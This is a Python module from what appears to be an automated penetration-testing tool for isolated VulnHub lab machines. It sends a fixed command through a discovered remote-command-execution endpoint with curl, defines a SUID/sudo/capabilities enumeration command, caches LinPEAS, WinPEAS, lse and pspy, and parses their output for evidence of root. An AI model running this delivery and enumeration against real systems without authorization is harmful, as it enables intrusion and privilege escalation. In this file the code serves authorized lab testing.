"""Command delivery and post-exploitation script caching.

Technique scripts that need to run something *on the target* (T1548, T1068)
deliver a fixed command through the finding's command-execution endpoint. They
never let the planner compose the command string.

Post-exploitation enumerators (LinPEAS/WinPEAS) are served from a local cache
directory so a run works on an isolated VulnHub VM with no internet. A remote
fetch is attempted only when ``AUTOMATION_ALLOW_REMOTE_FETCH`` is enabled.
"""
from __future__ import annotations

import os
import re
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode

from app.automation.proc import run_command

#: Local cache locations, in priority order.
_SCRIPT_CACHE_DIRS = (
    "/root/.local/share/recon",
    "/usr/local/share/recon",
    "/opt/recon",
)

_LINPEAS_NAME = "linpeas.sh"
_WINPEAS_NAME = "winPEAS.bat"

_LINPEAS_REMOTE = (
    "https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh"
)
_WINPEAS_REMOTE = (
    "https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/"
    "winPEAS/winPEASbat/winPEAS.bat"
)

#: Additional target-side enumerators (resolved from the same cache dirs).
_LSE_NAME = "lse.sh"
_PSPY_NAME = "pspy64"

_LSE_REMOTE = (
    "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/"
    "master/lse.sh"
)
_PSPY_REMOTE = (
    "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
)

#: Short enumerator name -> candidate filenames in the cache dirs.
_ENUMERATOR_FILES: Dict[str, Tuple[str, ...]] = {
    "linpeas": (_LINPEAS_NAME,),
    "winpeas": (_WINPEAS_NAME,),
    "lse": (_LSE_NAME,),
    "pspy": (_PSPY_NAME, "pspy32", "pspy"),
}

#: Short enumerator name -> upstream URL (used only when remote fetch is allowed).
_ENUMERATOR_REMOTE: Dict[str, str] = {
    "linpeas": _LINPEAS_REMOTE,
    "winpeas": _WINPEAS_REMOTE,
    "lse": _LSE_REMOTE,
    "pspy": _PSPY_REMOTE,
}


def cached_script_path(name: str) -> Optional[str]:
    """Return the path to a cached enumerator, or None if not present."""
    for directory in _SCRIPT_CACHE_DIRS:
        candidate = os.path.join(directory, name)
        if os.path.isfile(candidate):
            return candidate
    return None


def cached_enumerator(name: str) -> Optional[str]:
    """Return the cached path for a named enumerator (linpeas/lse/pspy/...)."""
    files = _ENUMERATOR_FILES.get(name.lower(), (name,))
    for filename in files:
        path = cached_script_path(filename)
        if path:
            return path
    return None


def remote_url_for(name: str) -> Optional[str]:
    return _ENUMERATOR_REMOTE.get(name.lower())


def resolve_enumerator(name: str) -> Optional[str]:
    """Resolve an enumerator to a local path without touching the network."""
    if os.path.isabs(name) and os.path.isfile(name):
        return name
    return cached_enumerator(name)


def remote_fetch_allowed() -> bool:
    try:
        from app.core.config import settings

        return bool(settings.AUTOMATION_ALLOW_REMOTE_FETCH)
    except Exception:  # noqa: BLE001
        return False


def deliver_rce_command(
    ctx,
    command: str,
    *,
    timeout: int = 90,
) -> Tuple[int, str, str]:
    """Send one command to the finding's RCE endpoint via a bounded curl call.

    The command is URL-encoded; the endpoint and parameter come from the
    finding context, so an LLM cannot redirect the delivery to another host.
    """
    merged = ctx.merged_options()
    endpoint = str(merged.get("endpoint") or ctx.target)
    if not endpoint.startswith(("http://", "https://")):
        endpoint = ctx.target.rstrip("/") + "/" + endpoint.lstrip("/")
    parameter = str(merged.get("parameter_name") or "cmd")

    separator = "&" if "?" in endpoint else "?"
    url = f"{endpoint}{separator}{urlencode({parameter: command})}"
    return run_command(
        ["curl", "-sk", "--max-time", str(timeout), url],
        timeout=timeout + 15,
    )


# ---------------------------------------------------------------------------
# Local privilege-escalation enumeration (the fixed command T1548 delivers)
# ---------------------------------------------------------------------------

SUID_ENUM_COMMAND = (
    "echo '== SUID =='; find / -xdev -perm -4000 -type f 2>/dev/null; "
    "echo '== SGID =='; find / -xdev -perm -2000 -type f 2>/dev/null; "
    "echo '== SUDO =='; sudo -n -l 2>/dev/null || true; "
    "echo '== CAPS =='; getcap -r / 2>/dev/null | head -50; "
    "echo '== WRITABLE =='; find /etc /opt /srv -xdev -writable "
    "-type f 2>/dev/null | head -50"
)

#: Tokens whose presence in the enumeration output indicates privesc vectors.
LINPEAS_VECTOR_TOKENS = (
    "SUID", "sudo", "writable", "CVE", "capabilities", "cap_setuid",
    "NOPASSWD", "AlwaysInstallElevated", "SeImpersonatePrivilege",
    "Unquoted",
)


def looks_like_privesc_output(text: str) -> bool:
    return any(token in text for token in LINPEAS_VECTOR_TOKENS)


# ---------------------------------------------------------------------------
# Honest evidence adjudication
#
# The token match above is intentionally kept for backward compatibility, but
# it must NOT be used to *confirm* a technique: the enumeration command embeds
# the literal section headers ("== SUID ==", "== SUDO =="), so a naive token
# match is always true whenever the command ran at all. The helpers below
# instead parse the actual per-section results and require concrete evidence.
# ---------------------------------------------------------------------------

#: Section header -> evidence key for the fixed SUID/SGID/sudo/caps/writable
#: enumeration command (``SUID_ENUM_COMMAND``).
_ELEVATION_SECTIONS: Dict[str, str] = {
    "SUID": "suid",
    "SGID": "sgid",
    "SUDO": "sudo",
    "CAPS": "capabilities",
    "WRITABLE": "writable",
}

_ELEVATION_HEADER_RE = re.compile(r"^==\s*([A-Z]+)\s*==$")

#: Lines produced by the enumeration that are *not* findings.
_ELEVATION_NOISE = (
    "sudo: a password is required",
    "sudo: no tty present",
    "permission denied",
)


def summarize_elevation_controls(text: str) -> Dict[str, List[str]]:
    """Parse SUID/SGID/sudo/capabilities/writable sections into real findings.

    Only genuine result lines (paths, capability lists, sudo policy entries) are
    returned; the echoed section headers themselves are never counted. An empty
    list for a section means that section produced no usable evidence.
    """
    sections: Dict[str, List[str]] = {
        "suid": [],
        "sgid": [],
        "sudo": [],
        "capabilities": [],
        "writable": [],
    }
    current: Optional[str] = None
    for raw_line in (text or "").splitlines():
        line = raw_line.strip()
        if not line:
            continue
        header = _ELEVATION_HEADER_RE.match(line)
        if header is not None:
            current = _ELEVATION_SECTIONS.get(header.group(1))
            continue
        if current is None:
            continue
        lowered = line.lower()
        if any(noise in lowered for noise in _ELEVATION_NOISE):
            continue
        sections[current].append(line)
    return sections


def count_elevation_vectors(sections: Dict[str, List[str]]) -> int:
    """Total number of concrete elevation-control findings across sections."""
    return sum(len(items) for items in sections.values())


#: Definitive proof that a *current* execution context is uid 0. Enumerators
#: (LinPEAS/WinPEAS) do not themselves run ``id``, so presence is meaningful and
#: absence must never be reported as root.
_ROOT_EVIDENCE_PATTERNS = (
    re.compile(r"\buid=0\("),
    re.compile(r"\beuid=0\("),
    re.compile(r"\buid=0\b[^\n]*\bgid=0\b"),
)


def verify_root_evidence(text: str) -> bool:
    """Return True only on definitive uid-0 evidence, never on enumeration."""

    if not text:
        return False
    return any(pattern.search(text) for pattern in _ROOT_EVIDENCE_PATTERNS)


__all__ = [
    "cached_script_path",
    "cached_enumerator",
    "remote_url_for",
    "resolve_enumerator",
    "remote_fetch_allowed",
    "deliver_rce_command",
    "SUID_ENUM_COMMAND",
    "LINPEAS_VECTOR_TOKENS",
    "looks_like_privesc_output",
    "summarize_elevation_controls",
    "count_elevation_vectors",
    "verify_root_evidence",
    "_LINPEAS_NAME",
    "_WINPEAS_NAME",
    "_LINPEAS_REMOTE",
    "_WINPEAS_REMOTE",
    "_LSE_NAME",
    "_PSPY_NAME",
    "_LSE_REMOTE",
    "_PSPY_REMOTE",
    "_ENUMERATOR_FILES",
    "_ENUMERATOR_REMOTE",
]
